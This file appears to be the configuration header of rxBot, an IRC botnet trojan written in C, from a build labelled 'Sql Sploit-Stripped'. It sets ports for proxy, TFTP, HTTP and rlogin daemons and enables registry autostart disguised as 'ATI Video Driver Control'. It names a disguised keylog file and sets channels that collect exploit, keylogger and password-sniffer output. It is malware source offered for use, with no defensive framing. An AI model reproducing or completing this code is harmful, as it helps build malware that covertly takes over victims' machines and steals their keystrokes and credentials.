int port = 1918;				// server port
int port2 = 32000;				// backup server port
int socks4port = 859;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 9665;				// Port # for tftp daemon to 
int httpport = 801;			// Port # for http daemon to run on
int rloginport = 5328;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 4;				// how many random numbers in the nick
int nicktype = OSCOUNTRYNICK;		// nick type (see rndnick.h) 'OSCOUNTRYNICK
BOOL nickprefix = FALSE;	    // nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\Christina.jpg";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char botid[] = "blah";						// bot id
char version[] = "rxBotV8 Sql Sploit-Stripped.";		// Bots !version reply
char password[] = "blah";						// bot password
char server[] = "blah";			// server
char serverpass[] = "";							// server password
char channel[] = "blah";		// channel that the bot should join
char chanpass[] = "blah";							// channel password
char server2[] = "blah";							// backup server (optional)
char channel2[] = "##VnC#";							// backup channel (optional)
char chanpass2[] = "blah";							// backup channel password (optional)
char filename[] = "blah.exe";				// destination file name
char keylogfile[] = "cftmon.d1l";					// keylog filename
char valuename[] = "ATI Video Driver Control";			// value name for autostart
char nickconst[] = "Sql-Bitch|";						// first part to the bot's nick
char modeonconn[] = "+T+B-x";						// Can be more than one mode and contain both + and -
char chanmode[] = "+ntmsC";						// Channel mode after joining
char exploitchan[] = "blah";						// Channel where exploit messages get redirected
char keylogchan[] = "blah";							// Channel where keylog messages get redirected
char psniffchan[] = "blah";							// Channel where psniff messages get redirected

char *authost[] = {
	"*@Fukin-Network-Administrator.InSane-V0z.Net"
};

char *versionlist[] = {
    "mIRC v6.16 Khaled Mardam-Bey",
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "9wjdnh83jdp5uqnm"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif

